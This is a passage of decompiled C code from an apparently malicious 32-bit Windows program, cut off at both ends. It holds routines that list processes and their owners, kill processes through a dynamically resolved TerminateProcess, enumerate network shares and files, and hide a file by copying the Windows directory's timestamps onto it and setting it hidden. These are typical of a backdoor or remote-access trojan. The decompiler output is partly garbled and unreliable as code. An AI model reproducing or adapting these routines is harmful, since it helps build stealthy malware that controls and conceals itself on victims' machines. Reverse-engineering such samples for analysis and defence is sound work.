                g6 = v32;
                *v20 = v32;
                GetPriorityClass((int32_t *)str);
                *v20 = g6;
                CloseHandle((int32_t *)str);
                v16 = g62;
                v21 = v15;
                v17 = v16;
                if (v16 == 2) {
                  lab_0x40366b:
                    // 0x40366b
                    *v20 = g5;
                    *v19 = v14;
                    g6 = function_40338e((int32_t **)str, (int32_t)&str2);
                    *(int32_t *)(g7 + 4) = (int32_t)&v9;
                    *(int32_t *)g7 = 4;
                    *(int32_t *)(g7 - 4) = (int32_t)&c;
                    *(int32_t *)(g7 - 8) = g6;
                    *(int32_t *)(g7 - 12) = 0x403689;
                    __pseudo_call(v3);
                    *(int32_t *)(g7 - 4) = 512;
                    *(int32_t *)(g7 - 8) = v26;
                    *(int32_t *)(g7 - 12) = (int32_t)c;
                    *(int32_t *)(g7 - 16) = g6;
                    *(int32_t *)(g7 - 20) = 0x4036a0;
                    __pseudo_call((int32_t)NULL);
                    g1 = v26;
                    *(int32_t *)(g7 - 4) = v26;
                    function_4034cb(str);
                    *(int32_t *)g7 = v27;
                    *(int32_t *)(g7 - 4) = g6;
                    int32_t v35 = g7;
                    if (function_404889() == 0) {
                        // 0x4036c0
                        *(int32_t *)(g7 + 4) = (int32_t)"SYSTEM";
                        *(int32_t *)g7 = v27;
                        strcpy(str, (char *)&str2);
                        v35 = g7;
                        // branch -> 0x4036d3
                    }
                    // 0x4036d3
                    *(int32_t *)(v35 + 4) = g6;
                    CloseHandle((int32_t *)str);
                    v21 = v35;
                    v17 = g62;
                    // branch -> 0x4036da
                }
              lab_0x4036da:;
                int32_t v36 = v21 + 8; // 0x403750
                if (v17 == 1) {
                    // 0x4036e3
                    *(int32_t *)(v21 + 4) = v23;
                    *(int32_t *)v21 = v26;
                    strcpy(str, (char *)&str2);
                    *(int32_t *)(g7 - 4) = 92;
                    *(int32_t *)(g7 - 8) = v24;
                    hObject = (char *)256;
                    char * found_char_pos = strrchr((char *)256, (int32_t)c); // 0x403706
                    *(int32_t *)(g7 - 4) = (int32_t)found_char_pos + 1;
                    *(int32_t *)(g7 - 8) = v25;
                    strcpy(hObject, (char *)c);
                    *(int32_t *)(g7 - 4) = v25;
                    *(int32_t *)(g7 - 8) = v24;
                    strcpy(hObject, (char *)c);
                    *(int32_t *)(g7 + 28) = (int32_t)&hObject;
                    *(int32_t *)(g7 + 24) = v27;
                    GetUserNameA(hObject, &c->e0);
                    v36 = g7 + 32;
                    // branch -> 0x403741
                }
                int32_t v37 = v36; // 0x40378b
                if (v14 == 0) {
                    // 0x40374a
                    *(int32_t *)(v36 - 4) = (int32_t)&g10;
                    *(int32_t *)(v36 - 8) = v24;
                    strcpy(hObject, (char *)c);
                    *(int32_t *)(g7 - 4) = (int32_t)"OS Kernel";
                    *(int32_t *)(g7 - 8) = v26;
                    strcpy(hObject, (char *)c);
                    v37 = g7 + 16;
                    // branch -> 0x40376f
                }
                int32_t * v38 = (int32_t *)(v37 - 4); // 0x403775
                *v38 = (int32_t)"System";
                int32_t * v39 = (int32_t *)(v37 - 8); // 0x40377a
                *v39 = v24;
                if (lstrcmpiA(hObject, (char *)c) == 0) {
                    // 0x403785
                    *v38 = (int32_t)"OS Kernel";
                    *v39 = v26;
                    strcpy(hObject, (char *)c);
                    v37 = g7 + 8;
                    // branch -> 0x403798
                }
                // 0x403798
                *(int32_t *)(v37 - 4) = (int32_t)&g15;
                *(int32_t *)(v37 - 8) = v24;
                strcat(hObject, (char *)c);
                *(int32_t *)(g7 - 4) = v26;
                *(int32_t *)(g7 - 8) = v24;
                strcat(hObject, (char *)c);
                *(int32_t *)(g7 - 4) = (int32_t)&g14;
                *(int32_t *)(g7 - 8) = v24;
                strcat(hObject, (char *)c);
                *(int32_t *)(g7 - 4) = v24;
                *(int32_t *)(g7 - 8) = g2 - 0x2744 + g3;
                strcpy(hObject, (char *)c);
                *(int32_t *)(g7 - 4) = v24;
                int32_t v40 = strlen(hObject) + 1 + g3; // 0x4037ed
                *(int32_t *)(v40 - 0x2744 + g2) = v14;
                g6 = v40 + 4;
                *(int32_t *)(g7 - 4) = v27;
                *(int32_t *)(g7 - 8) = g2 - 0x2744 + g6;
                strcpy(hObject, (char *)c);
                *(int32_t *)(g7 - 4) = v27;
                int32_t v41 = strlen(hObject) + 1 + g6; // 0x403821
                *(int32_t *)(g7 - 4) = (int32_t)&v10;
                g3 = v41 + 4;
                *(int32_t *)(g7 - 8) = v29;
                if (!Process32Next((int32_t *)hObject, c)) {
                    v13 = v12;
                    v5 = v29;
                    // break -> 0x40384f
                    break;
                }
                // continue -> 0x40362e
            }
            // 0x40384f
            if (v5 != -1) {
                // 0x403855
                *(int32_t *)(g7 - 4) = v5;
                CloseHandle((int32_t *)hObject);
                // branch -> 0x40385e
            }
            // 0x40385e
            if (v13 == NULL) {
                // 0x40385e
                v22 = g7;
                // branch -> 0x40386d
            } else {
                // 0x403864
                v30 = g7;
                *(int32_t *)(v30 - 4) = (int32_t)v13;
                FreeLibrary((int32_t *)hObject);
                v22 = v30;
                // branch -> 0x40386d
            }
            // 0x40386d
            *(int32_t *)(v22 - 4) = g3;
            *(int32_t *)(v22 - 8) = (int32_t)&v2;
            return function_401f45((char *)g3, (int32_t)&str2);
        }
    }
    // 0x40361b
    g3 = 5;
    v13 = v12;
    v5 = v29;
    // branch -> 0x40384f
    // 0x40384f
    if (v5 != -1) {
        // 0x403855
        *(int32_t *)(g7 - 4) = v5;
        CloseHandle((int32_t *)hObject);
        // branch -> 0x40385e
    }
    // 0x40385e
    if (v13 == NULL) {
        // 0x40385e
        v22 = g7;
        // branch -> 0x40386d
    } else {
        // 0x403864
        v30 = g7;
        *(int32_t *)(v30 - 4) = (int32_t)v13;
        FreeLibrary((int32_t *)hObject);
        v22 = v30;
        // branch -> 0x40386d
    }
    // 0x40386d
    *(int32_t *)(v22 - 4) = g3;
    *(int32_t *)(v22 - 8) = (int32_t)&v2;
    return function_401f45((char *)g3, (int32_t)&str2);
}

// Address range: 0x403887 - 0x4038e6
int32_t function_403887(int32_t * a1) {
    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x40388e
    g6 = (int32_t)moduleHandle;
    int32_t func = (int32_t)GetProcAddress(moduleHandle, "TerminateProcess"); // 0x40389c
    g5 = func;
    FreeLibrary((int32_t *)g6);
    int32_t v1 = function_40338e((int32_t **)a1, 1); // 0x4038b1
    int32_t result; // 0x4038c7
    if (v1 == 0) {
        // 0x4038c3
        result = 0;
        // branch -> 0x4038c5
    } else {
        // 0x4038bc
        __pseudo_call(func);
        result = v1;
        // branch -> 0x4038c5
    }
    // 0x4038c5
    return result;
}

// Address range: 0x4038e7 - 0x403b41
int32_t function_4038e7(int32_t dwProcessId) {
    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x4038ee
    int32_t func = (int32_t)GetProcAddress(moduleHandle, "TerminateProcess"); // 0x4038fc
    FreeLibrary(moduleHandle);
    int32_t * v1 = OpenProcess(1, false, dwProcessId); // 0x403913
    int32_t result; // 0x403928
    if (v1 == NULL) {
        // 0x403924
        result = 0;
        // branch -> 0x403926
    } else {
        // 0x40391d
        __pseudo_call(func);
        result = (int32_t)v1;
        // branch -> 0x403926
    }
    // 0x403926
    return result;
}

// Address range: 0x403b42 - 0x403cd4
int32_t function_403b42(void) {
    int32_t v1 = g2; // bp-4
    g2 = &v1;
    int32_t v2 = *(int32_t *)&g31; // 0x403b5a9
    int32_t str = 0; // bp-536
    memcpy(&str, &((struct _NETRESOURCEA *)v2)->e0, *(int32_t *)&g28);
    g6 = 0x6b46;
    int32_t found_char_pos = (int32_t)strrchr((char *)*(int32_t *)&g31, 92); // 0x403b74
    g1 = found_char_pos;
    function_403d8d(found_char_pos);
    char * found_char_pos2 = strrchr((char *)&str, 92); // 0x403b85
    if (found_char_pos2 != NULL) {
        // 0x403b8e
        *(char *)((int32_t)found_char_pos2 + 1) = 0;
        // branch -> 0x403b92
    }
    // 0x403b92
    strcat((char *)&str, "*.*");
    int32_t v3 = 66; // bp-24
    int32_t * mem = malloc(0x7d00); // 0x403bac
    int32_t result = (int32_t)mem; // 0x403bac
    g5 = result;
    if (mem == NULL) {
        // 0x403cbd
        return result;
    }
    int32_t v4 = function_403d21((char *)&str); // 0x403bc6
    g6 = v4;
    int32_t * v5;
    if (v4 == -1) {
        // 0x403bbf
        // branch -> 0x403cb5
        // 0x403cb5
        free(mem);
        // branch -> 0x403cbd
        // 0x403cbd
        return (int32_t)&v5;
    }
    // 0x403bd7
    if (v4 == 0) {
        // 0x403bdb
        g6 = 1;
        // branch -> 0x403bde
    }
    // 0x403bde
    function_401f45((char *)&v3, 5);
    g4 = 5;
    int32_t * hFindFile = FindFirstFileA((char *)&str, (struct _WIN32_FIND_DATAA *)mem); // 0x403bff
    int32_t v6; // bp-12
    if (hFindFile == (int32_t *)-1) {
        // 0x403c0d
        strcpy((char *)(result + 44), g16);
        function_402830(result, 320, (char *)mem, (int32_t)&v6);
        function_401e99((char *)mem, 320);
        free(mem);
        // branch -> 0x403cbd
        // 0x403cbd
        return (int32_t)&v5;
    }
    int32_t v7 = function_403dda((char *)mem); // 0x403c40
    g4 = (int32_t)mem;
    int32_t v8; // bp-16
    if (v7 != 0) {
        // 0x403c4a
        function_402830(result, 320, (char *)mem, (int32_t)&v8);
        if (function_401e99((char *)mem, 320) == 0) {
            // 0x403cb5
            free(mem);
            // branch -> 0x403cbd
            // 0x403cbd
            return (int32_t)&v5;
        }
    }
    // 0x403c69
    v6 = 0;
    int32_t v9 = g6 - 1; // 0x403c6d
    g3 = v9;
    if (v9 < 1) {
        // 0x403cac
        FindClose(hFindFile);
        // branch -> 0x403cb5
        // 0x403cb5
        free(mem);
        // branch -> 0x403cbd
    } else {
        // 0x403c74
        // branch -> 0x403c74
        while (true) {
            int32_t v10 = function_403cd5(hFindFile, result); // 0x403c78
            g4 = (int32_t)mem;
            if (v10 != -1) {
                // 0x403c84
                v6 += v10;
                int32_t v11 = 320 * v10; // 0x403c8d
                g6 = v11;
                function_402830(result, v11, (char *)mem, (int32_t)&v8);
                if (function_401e99((char *)mem, g6) != 0) {
                    // 0x403ca7
                    if (v6 >= v9) {
                        // break -> 0x403cac
                        break;
                    }
                    // continue -> 0x403c74
                    continue;
                }
            }
            // 0x403cc2
            free(mem);
            int32_t result2 = FindClose(hFindFile); // 0x403ccd
            // branch -> 0x403cbd
            // 0x403cbd
            return result2;
        }
        // 0x403cac
        FindClose(hFindFile);
        // branch -> 0x403cb5
        // 0x403cb5
        free(mem);
        // branch -> 0x403cbd
    }
    // 0x403cbd
    return (int32_t)&v5;
}

// Address range: 0x403cd5 - 0x403d20
int32_t function_403cd5(int32_t * hFindFile, int32_t lpFindFileData) {
    int32_t v1 = g5; // 0x403cdd
    g5 = lpFindFileData;
    g3 = 0;
    if (!FindNextFileA(hFindFile, (struct _WIN32_FIND_DATAA *)lpFindFileData)) {
        // 0x403ce9
        // branch -> 0x403d1d
    } else {
        while (true) {
            // 0x403cef
            if (g24 != 0) {
                // 0x403d16
                // branch -> 0x403d1d
                // 0x403d1d
                g5 = v1;
                return -1;
            }
            int32_t v2 = g5; // 0x403cf8
            int32_t v3 = function_403dda((char *)v2); // 0x403cf9
            g4 = v2;
            int32_t v4 = g3;
            int32_t result = v4; // 0x403d0a
            if (v3 != 0) {
                int32_t v5 = v4 + 1; // 0x403d03
                g3 = v5;
                g5 += 320;
                result = v5;
                // branch -> 0x403d0a
            }
            // 0x403d0a
            if (result < 100) {
                // 0x403d0f
                if (!FindNextFileA(hFindFile, (struct _WIN32_FIND_DATAA *)g5)) {
                    // break -> 0x403ce9
                    break;
                }
                // continue -> 0x403cef
                continue;
            }
            // 0x403d1d
            g5 = v1;
            return result;
        }
        // 0x403ce9
        // branch -> 0x403d1d
    }
    // 0x403d1d
    g5 = v1;
    return g3;
}

// Address range: 0x403d21 - 0x403d8c
int32_t function_403d21(char * lpFileName) {
    int32_t v1 = g5; // 0x403d31
    int32_t lpFindFileData = 0; // bp-324
    g5 = 0;
    int32_t * v2 = FindFirstFileA(lpFileName, (struct _WIN32_FIND_DATAA *)&lpFindFileData); // 0x403d38
    g6 = (int32_t)v2;
    int32_t result; // 0x403d87
    if (v2 == (int32_t *)-1) {
        // 0x403d87
        result = g5;
        // branch -> 0x403d89
    } else {
        // 0x403d45
        // branch -> 0x403d45
        while (true) {
            int32_t v3 = function_403dda((char *)&lpFindFileData); // 0x403d4c
            g4 = &lpFindFileData;
            if (v3 != 0) {
                // 0x403d56
                g5++;
                // branch -> 0x403d57
            }
            // 0x403d57
            if (g24 != 0) {
                // 0x403d74
                FindClose(&((struct _WIN32_FIND_DATAA *)g6)->e0);
                // branch -> 0x403d89
                // 0x403d89
                g5 = v1;
                return -1;
            }
            // 0x403d60
            if (!FindNextFileA((int32_t *)g6, (struct _WIN32_FIND_DATAA *)&lpFindFileData)) {
                // break -> 0x403d80
                break;
            }
            // continue -> 0x403d45
        }
        // 0x403d80
        FindClose(&((struct _WIN32_FIND_DATAA *)g6)->e0);
        // branch -> 0x403d87
        // 0x403d87
        // branch -> 0x403d89
    }
    // 0x403d89
    g5 = v1;
    return result;
}

// Address range: 0x403d8d - 0x403dd9
int32_t function_403d8d(int32_t a1) {
    // 0x403d8d
    g55 = 0;
    int32_t v1 = g6; // bp-4
    if (a1 == 0) {
        // 0x403dd8
        return g1;
    }
    // branch -> 0x403d9e
    while (true) {
        int32_t str = a1 + 1; // 0x403d9e
        int32_t v2 = str; // edi
        char * found_char_pos = strchr((char *)str, 59); // 0x403da4
        if (found_char_pos != NULL) {
            // 0x403db2
            *found_char_pos = 0;
            // branch -> 0x403db5
        }
        int32_t str2 = v2; // 0x403db5
        int32_t len = strlen((char *)str2); // 0x403db6
        g1 = len;
        g4 = str2;
        if (len >= 2) {
            int32_t v3 = g55; // 0x403dc1
            g1 = v3;
            g55 = v3 + 1;
            *(int32_t *)(4 * v3 + (int32_t)&g56) = v2;
            // branch -> 0x403dd3
        }
        int32_t v4 = (int32_t)found_char_pos; // 0x403dd3
        if (v4 == 0) {
            // break -> 0x403dd7
            break;
        }
        a1 = v4;
        // continue -> 0x403d9e
    }
    // 0x403dd7
    // branch -> 0x403dd8
    // 0x403dd8
    g6 = v1;
    return g1;
}

// Address range: 0x403dda - 0x4047d1
int32_t function_403dda(char * a1) {
    int32_t v1 = g5; // 0x403dde
    int32_t result; // 0x403e83
    if ((*a1 & 16) != 0) {
        // 0x403e84
        result = 1;
        // branch -> 0x403e7e
    } else {
        int32_t str = (int32_t)a1 + 44; // 0x403dec
        char * found_char_pos = strrchr((char *)str, 46); // 0x403df2
        if (g55 >= 1) {
            int32_t lpString1 = &g56; // esi
            int32_t str2 = &g56; // 0x403e17
            char * v2 = NULL;
            // branch -> 0x403e17
            while (true) {
                // 0x403e17
                if (strlen((char *)*(int32_t *)str2) >= 2) {
                    // 0x403e24
                    if (lstrcmpiA((char *)*(int32_t *)lpString1, "*.*") != 0) {
                        // 0x403e31
                        int32_t lpString1_;
                        char * lpString2; // 0x403e63
                        if (found_char_pos == NULL) {
                            // 0x403e5c
                            lpString2 = "*.";
                            lpString1_ = *(int32_t *)lpString1;
                            // branch -> 0x403e63
                          lab_0x403e63:
                            // 0x403e63
                            if (lstrcmpiA((char *)lpString1_, lpString2) != 0) {
                                goto lab_0x403e69;
                            }
                            // 0x403e84
                            // branch -> 0x403e7e
                            // 0x403e7e
                            g5 = v1;
                            return 1;
                        }
                        int32_t len = strlen((char *)(*(int32_t *)lpString1 + 2)); // 0x403e3d
                        if (len == 0) {
                            // 0x403e7c
                            // branch -> 0x403e7e
                            // 0x403e7e
                            g5 = v1;
                            return 0;
                        }
                        int32_t len2 = strlen((char *)str); // 0x403e4a
                        lpString2 = (char *)(*(int32_t *)lpString1 + 2);
                        lpString1_ = str + len2 - len;
                        // branch -> 0x403e63
                        goto lab_0x403e63;
                    }
                    // 0x403e84
                    // branch -> 0x403e7e
                    // 0x403e7e
                    g5 = v1;
                    return 1;
                }
              lab_0x403e69:;
                uint32_t v3 = (int32_t)v2 + 1; // 0x403e69
                int32_t v4 = lpString1 + 4; // 0x403e6d
                lpString1 = v4;
                if (v3 >= g55) {
                    // break -> 0x403e7c
                    break;
                }
                str2 = v4;
                v2 = (char *)v3;
                // continue -> 0x403e17
            }
            // 0x403e7c
            // branch -> 0x403e7e
            // 0x403e7e
            g5 = v1;
            return 0;
        }
        // 0x403e7c
        result = 0;
        // branch -> 0x403e7e
    }
    // 0x403e7e
    g5 = v1;
    return result;
}

// Address range: 0x4047d2 - 0x404888
int32_t function_4047d2(struct _FILETIME * lpFileName) {
    int32_t v1 = g2; // 0x4047d2
    int32_t v2 = g5; // 0x4047dd
    int32_t lpBuffer = 0; // bp-1040
    GetWindowsDirectoryA((char *)&lpBuffer, 1024);
    int32_t dwShareMode = 0; // edi
    int32_t * fileHandle = CreateFileA((char *)&lpBuffer, -0x80000000, 5, NULL, 3, 0x2000000, NULL); // 0x40480f
    if (fileHandle == (int32_t *)-1) {
        // 0x404884
        g5 = v2;
        g2 = v1;
        return (int32_t)fileHandle;
    }
    int32_t * fileHandle2 = CreateFileA((char *)lpFileName, 0x40000000, dwShareMode, (struct _SECURITY_ATTRIBUTES *)dwShareMode, 3, 128, &((struct _FILETIME *)dwShareMode)->e0); // 0x40482b
    int32_t v3 = (int32_t)fileHandle2; // ebx
    int32_t handleClosed; // 0x40487e
    if (fileHandle2 != (int32_t *)-1) {
        struct _FILETIME * lpLastAccessTime = (struct _FILETIME *)dwShareMode; // 0x40483f
        int32_t lpCreationTime = 0; // bp-16
        GetFileTime(fileHandle, (struct _FILETIME *)&lpCreationTime, lpLastAccessTime, lpLastAccessTime);
        SetFileTime(&((struct _SECURITY_ATTRIBUTES *)v3)->e0, (struct _FILETIME *)&lpCreationTime, (struct _FILETIME *)&lpCreationTime, (struct _FILETIME *)&lpCreationTime);
        CloseHandle(fileHandle);
        CloseHandle(&((struct _FILETIME *)v3)->e0);
        int32_t v4 = GetFileAttributesA((char *)lpFileName); // 0x404872
        handleClosed = SetFileAttributesA((char *)lpFileName, v4 & 253 | 0x1000000 * v4 / 0x1000000 & -256 | 2);
        // branch -> 0x404884
    } else {
        // 0x404834
        handleClosed = CloseHandle(fileHandle);
        // branch -> 0x404884
    }
    // 0x404884
    g5 = v2;
    g2 = v1;
    return handleClosed;
}

// Address range: 0x404889 - 0x404904
int32_t function_404889(void) {
    // 0x404889
    int32_t ProcessHandle;
    int32_t TokenHandle = ProcessHandle;
    int32_t v1 = g2; // bp-4
    int32_t cchName = 256; // bp-12
    int32_t cchReferencedDomainName = 200; // bp-8
    if (OpenProcessToken((int32_t *)ProcessHandle, 0x20008, (int32_t **)&TokenHandle)) {
        int32_t TokenInformation = 0; // bp-1220
        int32_t ReturnLength = 0; // bp-16
        if (GetTokenInformation((int32_t *)TokenHandle, 1, &TokenInformation, 1000, &ReturnLength)) {
            int32_t ReferencedDomainName = 0; // bp-220
            int32_t peUse = 0; // bp-20
            char * Name;
            bool result = LookupAccountSidA(NULL, (int32_t *)TokenInformation, Name, &cchName, (char *)&ReferencedDomainName, &cchReferencedDomainName, &peUse); // 0x4048f7
            g2 = v1;
            return result;
        }
        // 0x4048b6
        g2 = v1;
        return 0;
    }
    // 0x4048b6
    g2 = v1;
    return 0;
}

// Address range: 0x404905 - 0x404b7f
int32_t function_404905(void) {
    // 0x404905
    g1 = 0x4240;
    function_405a10();
    g5 = 2;
    g3 = 0;
    struct _NETRESOURCEA * lpcCount = NULL; // bp-24
    *(int32_t *)&lpcCount = *(int32_t *)&g31;
    char * lpNetResource = (char *)2; // bp-64
    char * dwBytes = (char *)0x4000; // bp-20
    char * v1 = (char *)71; // bp-16964
    int32_t * str;
    int32_t substr_pos = (int32_t)strstr((char *)71, (char *)&str); // 0x40495d
    dwBytes = (char *)92;
    int32_t v2;
    int32_t v3; // bp-16959
    int32_t lphEnum; // bp-28
    char * v4; // bp-68
    int32_t v5;
    int32_t dwType; // 0x404a2c
    int32_t v6; // 0x404a4f
    int32_t v7; // 0x404a50
    int32_t v8; // 0x404b41
    int32_t v9; // 0x404a2f
    int32_t result; // 0x404b73
    int32_t v10; // 0x404a41
    if (substr_pos != g3) {
        int32_t str2 = substr_pos + 3; // 0x40496d
        lpcCount = (struct _NETRESOURCEA *)str2;
        int32_t found_char_pos = (int32_t)strchr((char *)str2, 92); // 0x404971
        g5 = found_char_pos;
        if (found_char_pos == g3) {
            // 0x404b3a
            v8 = g3;
            v3 = v8;
            g6 = 6;
            // branch -> 0x404b4a
            // 0x404b4a
            lpcCount = (struct _NETRESOURCEA *)&v4;
            lphEnum = &v3;
            function_402830(6, v8, (char *)&str, (int32_t)&str);
            result = function_401f45((char *)&v1, g6);
            // branch -> 0x404b7b
            // 0x404b7b
            return result;
        }
        int32_t str3 = found_char_pos + 1; // 0x404983
        dwBytes = (char *)92;
        lpcCount = (struct _NETRESOURCEA *)str3;
        int32_t v11 = substr_pos + 1; // 0x4049ae
        g6 = v11;
        int32_t result2; // 0x404b7f
        if (strchr((char *)str3, 92) == NULL) {
            // 0x4049ae
            dwBytes = (char *)2;
            *(char *)g5 = (char)g3;
            int32_t dwScope = (int32_t)dwBytes; // 0x4049b6
            g5 = dwScope;
            v2 = 0;
            // branch -> 0x404a24
            // 0x404a24
            dwBytes = (char *)&lphEnum;
            lpcCount = (struct _NETRESOURCEA *)&lpNetResource;
            dwType = g3;
            lphEnum = dwType;
            v9 = WNetOpenEnumA(dwScope, dwType, dwType, (struct _NETRESOURCEA *)&lpNetResource, (int32_t **)&lphEnum);
            if (v9 == 0) {
                // 0x404a3c
                v10 = (int32_t)GlobalAlloc(64, *(int32_t *)&dwBytes);
                g5 = v10;
                v5 = 5;
                // branch -> 0x404a4c
                while (true) {
                    // 0x404a4c
                    v6 = g3;
                    v7 = v10;
                    // branch -> 0x404a4c
                    goto lab_0x404a4c_5;
                }
            }
            // 0x404b3a
            v8 = g3;
            v3 = v8;
            g6 = 6;
            // branch -> 0x404b4a
            // 0x404b4a
            lpcCount = (struct _NETRESOURCEA *)&v4;
            lphEnum = &v3;
            function_402830(6, v8, (char *)&str, (int32_t)&str);
            result2 = function_401f45((char *)&v1, g6);
            // branch -> 0x404b7b
        } else {
            char * str5 = (char *)v11; // 0x404996
            dwBytes = str5;
            int32_t str4 = *(int32_t *)&g31; // 0x40499713
            *(int32_t *)&lpcCount = str4;
            strcpy((char *)str4, str5);
            g4 = (int32_t)dwBytes;
            result2 = function_403b42();
            // branch -> 0x404b7b
        }
        // 0x404b7b
        return result2;
    }
    int32_t str6 = *(int32_t *)&g31; // 0x4049b916
    *(int32_t *)&lpcCount = str6;
    char * found_char_pos2 = strrchr((char *)str6, 92); // 0x4049c5
    int32_t v12 = g3; // 0x4049c8
    if ((int32_t)found_char_pos2 == v12) {
        // 0x404b3a
        v8 = g3;
        v3 = v8;
        g6 = 6;
        // branch -> 0x404b4a
        // 0x404b4a
        lpcCount = (struct _NETRESOURCEA *)&v4;
        lphEnum = &v3;
        function_402830(6, v8, (char *)&str, (int32_t)&str);
        result = function_401f45((char *)&v1, g6);
        // branch -> 0x404b7b
        // 0x404b7b
        return result;
    }
    // 0x4049d1
    *found_char_pos2 = (char)v12;
    struct _NETRESOURCEA * str10 = g31; // 0x4049d3
    if (found_char_pos2 == (char *)str10) {
        // 0x4049d1
        v2 = 0;
        // branch -> 0x404a24
        // 0x404a24
        lphEnum = 0;
        dwBytes = (char *)&lphEnum;
        lpcCount = (struct _NETRESOURCEA *)&lpNetResource;
        dwType = g3;
        lphEnum = dwType;
        v9 = WNetOpenEnumA(g5, dwType, dwType, (struct _NETRESOURCEA *)&lpNetResource, (int32_t **)&lphEnum);
        if (v9 == 0) {
            // 0x404a3c
            v10 = (int32_t)GlobalAlloc(64, *(int32_t *)&dwBytes);
            g5 = v10;
            v5 = 5;
            int32_t v13 = v10;
            // branch -> 0x404a4c
            while (true) {
              lab_0x404a4c:
                // 0x404a4c
                v6 = g3;
                v7 = v13;
                // branch -> 0x404a4c
              lab_0x404a4c_5:;
                int32_t v14; // bp-16
                int32_t v15;
                int32_t v16; // 0x404a6a
                struct _NETRESOURCEA * v17; // 0x404a72
                while (true) {
                    // 0x404a4c
                    memset((int32_t *)*(int32_t *)&dwBytes, v7, v6);
                    int32_t v18 = WNetEnumResourceA((int32_t *)lphEnum, (int32_t *)&lpcCount, (int32_t *)g5, (int32_t *)&dwBytes); // 0x404a65
                    v16 = g3;
                    if (v18 != v16) {
                        // 0x404b23
                        GlobalFree((int32_t *)g5);
                        WNetCloseEnum((int32_t *)lphEnum);
                        g6 = v5;
                        if (v5 != 5) {
                            // 0x404b23
                            v3 = 0;
                            // branch -> 0x404b4a
                            // 0x404b4a
                            v4 = NULL;
                            lpcCount = (struct _NETRESOURCEA *)&v4;
                            lphEnum = &v3;
                            function_402830(v5, v3, (char *)&str, (int32_t)&str);
                            result = function_401f45((char *)&v1, g6);
                            // branch -> 0x404b7b
                            // 0x404b7b
                            return result;
                        }
                        // 0x404b3a
                        v8 = g3;
                        v3 = v8;
                        g6 = 6;
                        // branch -> 0x404b4a
                        // 0x404b4a
                        lpcCount = (struct _NETRESOURCEA *)&v4;
                        lphEnum = &v3;
                        function_402830(6, v8, (char *)&str, (int32_t)&str);
                        result = function_401f45((char *)&v1, g6);
                        // branch -> 0x404b7b
                        // 0x404b7b
                        return result;
                    }
                    // 0x404a72
                    v17 = lpcCount;
                    v14 = v16;
                    v15 = g5;
                    if ((int32_t)v17 > v16) {
                        // break -> 0x404a7a
                        break;
                    }
                    v6 = v16;
                    v7 = v15;
                    // continue -> 0x404a4c
                }
                int32_t v19 = v15 + 20; // 0x404a7a
                g6 = v19;
                int32_t v20 = v5;
                int32_t v21 = v15;
                int32_t v22 = v16; // 0x404a7f
                int32_t v23 = v16; // 0x404b0c22
                // branch -> 0x404a7d
                while (true) {
                    int32_t v24 = *(int32_t *)v19; // 0x404a7d
                    int32_t v25 = v20;
                    int32_t v26 = v21;
                    struct _NETRESOURCEA * v27 = v17; // 0x404b15
                    int32_t v28 = v19; // 0x404b0f
                    int32_t v29 = v23; // 0x404b0c
                    if (v24 != v22) {
                        // 0x404a87
                        if (*(int32_t *)(v19 - 16) == 1) {
                            int32_t found_char_pos3 = (int32_t)strchr((char *)(v24 + 2), 92); // 0x404a93
                            if (found_char_pos3 != g3) {
                                // 0x404a9f
                                *(int32_t *)g6 = found_char_pos3 + 1;
                                // branch -> 0x404aa2
                            }
                        }
                        // 0x404aa2
                        strcpy((char *)(v20 - 0x4240 + g2), (char *)*(int32_t *)g6);
                        char * str7 = (char *)*(int32_t *)g6; // 0x404ab4
                        lpNetResource = str7;
                        int32_t v30 = v20 + strlen(str7); // 0x404abe
                        g5 = v30;
                        if (v2 != g3) {
                            // 0x404ac5
                            int32_t str9; // bp-580
                            function_404b80(*(int32_t *)g6, (int32_t)&str9);
                            lpNetResource = (char *)&str9;
                            char * str8 = (char *)(g2 - 0x4240 + g5); // 0x404ae1
                            v4 = str8;
                            strcpy(str8, (char *)&str9);
                            v30 = g5 + strlen((char *)&str9);
                            // branch -> 0x404af8
                        }
                        // 0x404af8
                        *(int32_t *)(v30 - 0x423f + g2) = *(int32_t *)(g6 - 12);
                        g5 = v10;
                        v25 = 5 + v30;
                        v26 = v10;
                        v27 = lpcCount;
                        v28 = g6;
                        v29 = v14;
                        // branch -> 0x404b0c
                    }
                    int32_t v31 = v29 + 1; // 0x404b0c
                    v14 = v31;
                    int32_t v32 = v28 + 32; // 0x404b0f
                    g6 = v32;
                    if (v31 >= (int32_t)v27) {
                        v5 = v25;
                        v13 = v26;
                        goto lab_0x404a4c;
                    }
                    // 0x404b0c
                    v20 = v25;
                    v21 = v26;
                    v17 = v27;
                    v22 = g3;
                    v23 = v31;
                    v19 = v32;
                    // branch -> 0x404a7d
                }
            }
        }
    } else {
        // 0x4049dd
        dwBytes = (char *)92;
        lpcCount = str10;
        char * found_char_pos4 = strrchr((char *)str10, 92); // 0x4049e0
        if ((int32_t)found_char_pos4 != g3) {
            int32_t dwScope2 = g5; // 0x4049ec
            struct _NETRESOURCEA * v33 = g31; // 0x404a15
            if (g62 != dwScope2) {
                // 0x404a15
                if (found_char_pos4 != (char *)v33) {
                    v2 = 0;
                    // 0x404a24
                    dwBytes = (char *)&lphEnum;
                    lpcCount = (struct _NETRESOURCEA *)&lpNetResource;
                    dwType = g3;
                    lphEnum = dwType;
                    v9 = WNetOpenEnumA(dwScope2, dwType, dwType, (struct _NETRESOURCEA *)&lpNetResource, (int32_t **)&lphEnum);
                    if (v9 == 0) {
                        // 0x404a3c
                        v10 = (int32_t)GlobalAlloc(64, *(int32_t *)&dwBytes);
                        g5 = v10;
                        v5 = 5;
                        // branch -> 0x404a4c
                        while (true) {
                            // 0x404a4c
                            v6 = g3;
                            v7 = v10;
                            // branch -> 0x404a4c
                            goto lab_0x404a4c_5;
                        }
                    }
                    // 0x404b3a
                    v8 = g3;
                    v3 = v8;
                    g6 = 6;
                    // branch -> 0x404b4a
                    // 0x404b4a
                    lpcCount = (struct _NETRESOURCEA *)&v4;
                    lphEnum = &v3;
                    function_402830(6, v8, (char *)&str, (int32_t)&str);
                    result = function_401f45((char *)&v1, g6);
                    // branch -> 0x404b7b
                    // 0x404b7b
                    return result;
                }
            } else {
                // 0x4049fa
                if (found_char_pos4 == (char *)v33) {
                    // 0x404a02
                    v2 = 0;
                    // branch -> 0x404a24
                    // 0x404a24
                    dwBytes = (char *)&lphEnum;
                    lpcCount = (struct _NETRESOURCEA *)&lpNetResource;
                    dwType = g3;
                    lphEnum = dwType;
